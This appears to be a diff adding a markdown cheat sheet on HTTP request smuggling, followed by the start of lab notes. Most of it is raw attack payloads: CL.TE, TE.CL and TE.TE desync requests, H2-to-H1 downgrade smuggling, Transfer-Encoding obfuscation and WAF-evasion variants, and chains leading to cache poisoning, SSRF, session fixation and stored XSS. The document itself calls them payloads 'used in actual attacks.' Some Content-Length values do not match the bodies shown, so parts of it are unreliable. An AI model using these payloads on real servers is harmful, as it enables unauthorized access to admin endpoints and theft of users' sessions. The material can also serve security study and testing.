@@ -1,3 +1,303 @@
+
+# **✅ HTTP Request Smuggling – Complete Test Case (with Bypass Cases)**
+
+---
+
+# **1. List of Vulnerabilities**
+
+```
+1.1 CL.TE (Content-Length vs Transfer-Encoding mismatch)
+1.2 TE.CL (Transfer-Encoding vs Content-Length mismatch)
+1.3 TE.TE (Dual Transfer-Encoding header collision)
+1.4 Obfuscated Transfer-Encoding header bypass
+1.5 H/2 to H/1 downgrading smuggling
+1.6 HTTP/1.1 pipeline desync attacks
+1.7 HTTP/2 request queue poisoning
+1.8 Smuggling via folded headers (obsolete line folding)
+1.9 Reverse proxy parsing inconsistencies (Nginx, HAProxy, Apache)
+1.10 Response queue poisoning → Cache poisoning → Credential theft
+```
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+*(Basic learning/test payloads — safe)*
+
+```
+2.1 CL.TE Basic Smuggle
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: victim.com
+```
+
+```
+2.2 TE.CL Basic Smuggle
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+Z
+0
+
+GET /pwned HTTP/1.1
+Host: victim.com
+```
+
+```
+2.3 Obfuscated TE Header
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding : chunked
+Content-Length: 6
+
+0
+
+X
+```
+
+```
+2.4 Smuggling With Upper/Lower Case
+Transfer-encoding: chunked
+```
+
+```
+2.5 CL Overread Attempt
+Content-Length: 100
+<10-byte-body>
+```
+
+---
+
+# **3. Sample Payloads (Updated With Real Payloads for Learning)**
+
+*(Real offensive request smuggling payloads used in actual attacks)*
+
+```
+3.1 CL.TE Attack – Insert New Request
+POST / HTTP/1.1
+Host: victim
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: victim
+```
+
+```
+3.2 TE.CL Attack – Admin Panel Access
+POST /login HTTP/1.1
+Host: victim
+Transfer-Encoding: chunked
+Content-Length: 5
+
+1
+A
+0
+
+GET /admin/dashboard HTTP/1.1
+Host: victim
+```
+
+```
+3.3 TE.TE Dual Header Collision
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+```
+
+```
+3.4 H2 → H1 Downgrade Smuggling
+:method: POST
+:scheme: https
+:authority: victim.com
+transfer-encoding: chunked
+
+0
+
+GET /private
+```
+
+```
+3.5 Reverse Proxy Poisoning (Nginx → Apache)
+POST / HTTP/1.1
+Host: victim
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+GET /secret HTTP/1.1
+Host: victim
+```
+
+```
+3.6 Cache Poisoning Smuggle
+POST /cacheable HTTP/1.1
+Host: victim
+Content-Length: 16
+Transfer-Encoding: chunked
+
+0
+
+GET /profile?user=admin HTTP/1.1
+Host: victim
+```
+
+```
+3.7 Header Injection via Smuggle
+POST / HTTP/1.1
+Host: victim
+Content-Length: 33
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+X-Admin: true
+```
+
+```
+3.8 Credential Theft (forward poisoning)
+POST / HTTP/1.1
+Host: victim
+Content-Length: 10
+Transfer-Encoding: chunked
+
+0
+
+GET /cookies HTTP/1.1
+Host: victim
+```
+
+```
+3.9 WAF Bypass → Hidden Admin
+POST / HTTP/1.1
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+```
+
+```
+3.10 Chained Smuggle → Backend Command Trigger
+0
+
+POST /trigger?cmd=restart HTTP/1.1
+Host: victim
+```
+
+---
+
+# **4. Bypass Techniques (Filter Bypass, Header Obfuscation, WAF Evasion)**
+
+```
+4.1 TE Header Obfuscation
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+```
+
+```
+4.2 Whitespaces Bypass
+Transfer-Encoding : chunked
+```
+
+```
+4.3 Tab Injection
+Transfer-Encoding:\tchunked
+```
+
+```
+4.4 Mixed Case Bypass
+TrAnSfEr-EnCoDiNg: chunked
+```
+
+```
+4.5 Duplicate Headers Bypass
+Transfer-Encoding: chunked
+Transfer-Encoding: cow
+```
+
+```
+4.6 Chunked Body Obfuscation
+1;ext=1
+A
+0
+```
+
+```
+4.7 Line Folding (Obsolete RFC)
+Transfer-Encoding:
+ chunked
+```
+
+```
+4.8 Encoded TE Header
+Transfer-Encoding:%20chunked
+```
+
+```
+4.9 Injecting Null Bytes
+Transfer-Encoding: chunked%00
+```
+
+```
+4.10 Multi-Proxy Parsing Confusion
+Content-Length: 999
+Transfer-Encoding: chunked
+```
+
+---
+
+# **5. Advanced Attack Chains (Real-World Exploitation)**
+
+```
+5.1 Smuggling → Cache Poisoning → Credential Hijack
+Smuggle a malicious GET request that is stored in cache.
+```
+
+```
+5.2 Smuggling → Internal Admin Endpoint Exposure
+Inject:
+GET /internal/admin HTTP/1.1
+Host: victim
+```
+
+```
+5.3 Smuggling → Web Application Firewall Bypass
+Use obfuscated TE header + chunked body trick.
+```
+
+```
+5.4 Smuggling → Session Fixation
+Force backend to process attacker-controlled Set-Cookie.
+```
+
+```
+5.5 Smuggling → JWT Kid Injection via Queued Request
+Queue request modifying "kid" header used by backend.
+```
+
+```
+5.6 Smuggling → SSRF via Backend Follow-Up Request
+Inject:
+GET http://127.0.0.1:8080/admin
+```
+
+```
+5.7 Smuggling → Stored XSS Through Cache Poisoning
+Inject malicious JavaScript into cacheable responses.
+```
+---
+
 01 HTTP request smuggling, basic CL.TE vulnerability
 ====================================================
 
@@ -1565,3 +1865,4 @@ Content-Length: 3
 
 a
 ```
+
